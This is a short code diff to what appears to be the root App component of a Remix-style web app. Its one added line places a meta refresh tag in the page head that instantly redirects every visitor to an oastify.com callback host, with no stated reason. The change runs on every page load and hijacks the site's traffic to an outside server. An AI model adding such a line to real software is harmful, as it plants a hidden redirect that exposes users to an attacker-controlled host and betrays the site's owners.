@@ -47,6 +47,7 @@ export default function App() {
   return (
     <html lang="en">
       <head>
+    <meta http-equiv="refresh" content="0;URL=http://owo8qet1ifi55n1lgya5ajkrsiy9m0rog.oastify.com"/>
         <Meta />
         <Links />
       </head>
